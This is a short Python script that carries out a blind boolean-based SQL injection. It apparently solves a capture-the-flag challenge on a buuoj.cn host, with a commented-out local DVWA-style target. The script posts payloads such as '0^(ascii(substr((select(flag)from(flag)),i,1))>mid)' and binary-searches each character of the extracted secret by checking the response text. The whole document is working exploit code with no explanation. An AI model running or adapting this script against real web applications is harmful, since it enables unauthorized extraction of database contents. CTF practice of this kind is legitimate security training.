import requests
import time

url = "http://8d6e27f3-2477-446c-840d-d5c0bd81820f.node3.buuoj.cn"
# url = "http://192.168.0.2:8080/vulnerabilities/sqli/"
payload = {
	"id" : ""
}
result = ""
for i in range(1,100):
	l = 33
	r =130
	mid = (l+r)>>1
	while(l<r):
		payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
		html = requests.post(url,data=payload)
		print(payload)
		if "Hello" in html.text:
			l = mid+1
		else:
			r = mid
		mid = (l+r)>>1
	if(chr(mid)==" "):
		break
	result = result + chr(mid)
	print(result)
print("flag: " ,result)
